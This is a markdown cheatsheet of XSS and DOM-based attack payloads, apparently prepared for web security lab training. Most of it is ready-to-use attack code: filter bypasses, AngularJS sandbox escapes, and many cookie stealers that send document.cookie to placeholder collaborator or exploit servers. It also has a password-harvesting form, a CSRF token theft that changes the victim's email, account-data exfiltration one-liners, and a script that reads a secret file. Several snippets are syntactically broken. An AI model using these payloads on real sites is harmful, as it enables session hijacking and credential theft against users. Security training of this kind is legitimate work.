# XSS && DOM vulnerabilities - CHEATSHEET + MOST IMPORTANT LABS

## Index
- [XSS \&\& DOM vulnerabilities - CHEATSHEET + LABS](#xss--dom-vulnerabilities---cheatsheet--labs)
  - [Index](#index)
  - [Walkthrough - Most Important Labs](#walkthrough---most-important-labs)
  - [CHEATSHEET](#cheatsheet)
      - [POC-COOKIE-STEALER](#poc-cookie-stealer)
      - [GENERIC-PAYLOADS-POC](#generic-payloads-poc)
      - [BYPASS-RESTRICTIONS](#bypass-restrictions)
      - [COOKIE-STEALER](#cookie-stealer)
      - [DATA-STEALER](#data-stealer)
      - [SVG-TAGS](#svg-tags)
      - [DOM-POST-MESSAGES](#dom-post-messages)
      - [SINKS-AND-SOURCES](#sinks-and-sources)
  
  
## Walkthrough - Most Important Labs

- [POC - HOW TO FIND DOM XSS WITH DOM INVADER](DOM-INTRUDER.md) 👁️
- [XSS Reflected - how to find tags and attributed blocked and WAF bypass + extra: customtags](tags-and-attributed-blockec-waf-bypass.md) 👁️
 
- [DOM XSS in document.write sink using source location.search - SVG TAG](dom-xss-sink-source-svg.md)
- [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md) 🔥
- [DOM XSS documentwirte sink + location.search sources -> closing select tag](dom-xss-documentwrite-select-tag.md) 🔥
- [DOM XSS Reflected - eval() + json format without JSON.parse()](dom-xss-reflected-eval-json-escape.md)
- [DOM XSS using web messages and JSON.parse](DOM-XSS-using-web-messages-and-JSON.parse.md)
- [DOM based open redirect](DOM-based-open-redirect.md)
- [DOM XSS cookie manipulator via last viewed product](dom-xss-cookie-manipulator-via-last-viewed-product.md) 🔥


## CHEATSHEET

#### POC-COOKIE-STEALER

> 🧪 POC of cookie stealer in your browser: 🧪

 In web browser → DevTools → Console add a test cookie

```js
document.cookie = "cookieTest=STEAL-ME-PLS";
```

![Screenshot1](/04-Screenshots/poc1.png)

> Find an XSS vulnerability and inject a cookie-exfiltration payload targeting a controlled collaborator endpoint.

![Screenshot2](/04-Screenshots/poc2.png)

![Screenshot3](/04-Screenshots/poc3.png)

Repeat the same procedure with the target victim


#### GENERIC-PAYLOADS-POC
```js
<script>alert(1)</script>
<img src=0 onerror=alert(0)>
<img src=0 onerror=alert`0`>
<img src=0 oNeRrOr=alert(0)>
<img src=x onerror="&#x61;lert(1)">
<img src=x onerror="#00000000000058;alert(1)">
<script src="http://<IP>/foo"></script>
' - alert(1) - '
\' - alert(1) -'
\' - alert(1) //
' + alert(1) + '
javascript:alert(0)
${alert(0)}
<svg><animateTransform onbegin=alert(1)>

// JQuery $ + onhashchange #
<iframe src="<IP>/#" onload="this.src+='<img src=0 onerror=alert(0)>'</iframe>

// custom tag
<custom-tag onfocus="alert(1)" id="x" tabindex="1"> -> in the end of url add #x to reference the custom tag

//angularJS
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
{{1+1}}

// canonical link + access key -> test with alt+shift+x || ctrl+alt+x || alt+x ..etc
?'accesskey='x'onclick='alert(1)'

```

#### BYPASS-RESTRICTIONS
```js
// -> escape ' with \
\'<script>alert(1)</script>

// -> escape \ with other \ and escape ' with \
\\'<script>alert(1)</script>

// -> escape ' with \ + comment the rest of the js code with //
\' - alert(1) // 

// in JS template ` 
${alert(0)}
// ->  in html context, close <script> tag an inject another
x</script><script>alert(1)</script>
// the server escape our ' -> escape \ with other \  -> add xss -> comment the rest of the js code
\'-alert(1)//

// the server escape our ' and \ -> ' in html entity -> &apos; 
http://foo?&apos;-alert(1)-&apos;

// replace(<>)
<><img src=1 onerror=alert(1)>  

```

#### COOKIE-STEALER
```js

<script>document.location="http://<IP>/?cookie="+document.cookie"</script>

<script>fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));</script>

<script>fetch(https://<BURP-COLLAB>/${btoa(document.cookie)}</script>

<img src=0 onerror=this.src='https://<IP>/?cookie='+btoa(document.cookie)>

<img src=0 onerror="new Image().src='https://<IP>/?cookie='+btoa(document.cookie)">

<img src=0 onerror="fetch('https://<IP>/?cookie='+btoa(document.cookie))">

<svg><animateTransform onbegin=fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));>

<iframe src="<IP>/#" onload="this.src +='<img src=1 onerror=document.cookie()>'" hidden="hidden"></iframe>

<iframe src="<IP>/?cookie='+btoa(document.cookie))" onload=<img src=1 onerror=alert(1)> hidden="hidden"</iframe>

\';fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie))//

JavaScript:document.location='https://<BURP-COLLAB>?cookie='+document.cookie

${document.location='https://<BURP-COLLAB>/?cookies'+document.cookie;}

<script>fetch(`https://<BURP-COLLAB>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>
<script>fetch(`https://<EXPLOIT-SV>.net`, {method: ‘POST’,mode: ‘no-cors’,body:document.cookie});</script>

//angularJS
{{constructor.constructor('fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));')()}}

<svg><animateTransform onbegin=fetch('https://<BURP-COLLAB>?cookie='+btoa(document.cookie))>

// tags / atributtes blacklisted
<iframe
  src="https://<IP>>/?search="><body onresize=fetch('https://<EXPLOIT-SV>/exploit/?cookie='+btoa(document.cookie))>"
  onload="this.style.width='100px' ">
</iframe>

// angularJS
{{$on.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
{{$eval.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}
{{constructor.constructor('document.location="https://<COLLABORATOR||EXPLOIT-SV>?cookie="+document.cookie')()}}


// json format in response injected in eval() without JSON.parse == string
// eval() function it's a dangerous function that takes a string and execute it as javascript code
// the server scape " with \ so scape with another \ close } and comment with comment with javascript comment (//)
// adapt the payload in the exam depending of the parser
\"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//


// in comments
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>

```

#### DATA-STEALER
```js
// steal creds + cors bypass 
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://<IP>',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
```js
 // steal csrf token + cors bypass and csrf
 <script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```

ONE-LINERS
```js
// change accountDetails for the param required  
<script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('GET','https://<IP>/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://<EXPLOIT-SV>/?data='+encodeURIComponent(btoa(this.responseText));};</script>

// --------------------- //

<script>new XMLHttpRequest().withCredentials=true;void(req.onload=()=>location='https://<EXPLOIT-SV>/?d='+btoa(req.responseText));req.open('GET','https://<IP>/accountDetails');req.send()</script>

// -------------------- //


fetch('https://<IP>/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://<EXPLOIT-SV>/?d='+btoa(d))

/ --------------------- //

<script>document.location="https://<IP>/?<PARAM-XSS>=<ONE-LINER>"</script>

example: <script>https://<IP>/?productId=<ONELINER></script>




<script>
    document.location="http://<subdomain.<IP>/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('GET','https://<IP>.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://<EXPLOIT-SERVER>/log?key='%2b btoa(this.responseText) };%3c/script>&storeId=1"
</script>

```

READ /home/carlos/secret
```js
// XSS -> <script src="http://<IP>/exploit"></script>

var domain ="http://<IP>/home/carlos/secret"
var ourDomain = "http://<OUR-SERVER>/exploit"

var req = new XMLHttpRequest();
req.withCredentials = true;
req.open('GET', domain, false);
req.send();

var response = req.responseText;
req2.open('GET', ,ourDomain +"/steal?data= + btoa(response) , false);
req2.withCredentials = true;
req2.send(response);
```

#### SVG-TAGS
```js
// if you find a img tag:
"><svg onload=alert(1)>
<svg><animateTransform onbegin=alert(0)>

<svg><a><animate attributeName= href values=javascript:alert(0) /><text x=30 y=30>Click me!</a>

```

#### DOM-POST-MESSAGES
```js

// basic post message
window.postMessage('<img src=0 onerror=alert(1)>');

// post message in url
<iframe width=100% height=100% src="<ip>" 
onload='this.contentWindow.postMessage("javascript:alert(0)//https://google.com","*")'></iframe>


<iframe src="<IP>" onload="this.contentWindow.postMessage('<img src=0 onerror=alert(1)>', '*')"></iframe>
<iframe src="https://<IP>/" onload="this.contentWindow.postMessage('<img src=0 onerror=fetch(`https://EXPLOIT-SV>/?cookie=`+btoa(document.cookie))>', '*')"></iframe>
```

#### SINKS-AND-SOURCES

> SEARCH IN **SOURCE CODE** 
```
- SOURCES: origins of untrusted data (inputs coming from external sources).
- SINKS: points where that data can execute
- E.G -> sources -> x = window.location.search() + sink -> document.write(x)
```

**SOURCES**
```html
location.search
location.hash 
location.href

document.referrer
document.cookie 

URLSearchParams
window.name
window.location

input.value
textarea.value
select.value
localStorage.getItem()
sessionStorage.getItem()

```
**SINKS**
```html

element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

document.write()
document.writeln()

eval() 
replace()
new Function(...)
setTimeout(string) / setInterval(string) 

element.src, element.href 
location = ..., location.href = ..., location.replace()

fetch()
XMLHttpRequest.send() 

WebSocket.send()
postMessage() 
setRequestHeader() 

```

